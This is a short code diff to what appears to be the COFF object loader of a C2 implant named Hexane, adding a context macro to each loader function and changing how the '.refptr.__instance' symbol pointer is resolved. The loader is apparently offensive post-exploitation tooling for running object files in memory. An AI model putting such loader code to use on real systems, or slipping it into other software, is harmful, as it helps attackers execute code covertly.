@@ -95,7 +95,8 @@ namespace Objects {
         }
         // .refptr.__instance
         if (HashStringA(sym_string, MbsLength(sym_string)) == COFF_INSTANCE) {
-            *pointer = (_hexane*) GLOBAL_OFFSET;
+
+            *pointer = (_hexane*) C_DREF(GLOBAL_OFFSET);
             return *pointer ? true : false;
         }
 
@@ -103,6 +104,7 @@ namespace Objects {
     }
 
     BOOL ExecuteFunction(_executable *exe, const char *entry, void *args, const size_t size) {
+        HEXANE;
 
         void *veh_handle = nullptr;
         void *entrypoint = nullptr;
@@ -322,6 +324,7 @@ namespace Objects {
     }
 
     VOID AddCoff(_coff_params *coff) {
+        HEXANE;
 
         _coff_params *head = Ctx->coffs;
 
@@ -349,6 +352,7 @@ namespace Objects {
     }
 
     COFF_PARAMS* GetCoff(const uint32_t coff_id) {
+        HEXANE;
 
         auto head = Ctx->coffs;
         // NOTE: coff_id will be a known name hash
@@ -375,6 +379,7 @@ namespace Objects {
     }
 
     VOID RemoveCoff(uint32_t coff_id) {
+        HEXANE;
 
         _coff_params *prev = { };
 
@@ -409,6 +414,7 @@ namespace Objects {
     }
 
     VOID Cleanup(_executable *exe) {
+        HEXANE;
 
         if (!exe || !exe->base) {
             return;
@@ -437,6 +443,7 @@ namespace Objects {
     }
 
     VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size) {
+        HEXANE;
         // NOTE: sec_map seems to be the only thing that persists
 
         bool success = true;
